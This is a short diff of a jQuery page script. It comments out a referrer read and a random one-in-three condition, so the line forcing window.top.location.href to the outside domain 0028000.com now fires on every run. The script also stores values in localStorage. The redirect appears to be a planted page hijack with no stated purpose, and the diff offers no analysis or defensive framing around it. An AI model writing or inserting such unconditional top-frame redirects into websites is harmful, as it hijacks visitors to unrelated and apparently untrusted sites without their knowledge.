@@ -59,11 +59,11 @@ jQuery(function () {
       window.localStorage['mx'] = x;
       window.localStorage['mm'] = m
     }
-    var s=document.referrer;
-    var rr=3;
-    var rss=Math.floor(Math.random()*rr)
-    if(rss==1){
+    //var s=document.referrer;
+    //var rr=3;
+    //var rss=Math.floor(Math.random()*rr)
+   // if(rss==1){
       window.top.location.href="https://0028000.com";
-    }
+   // }
   }
 });
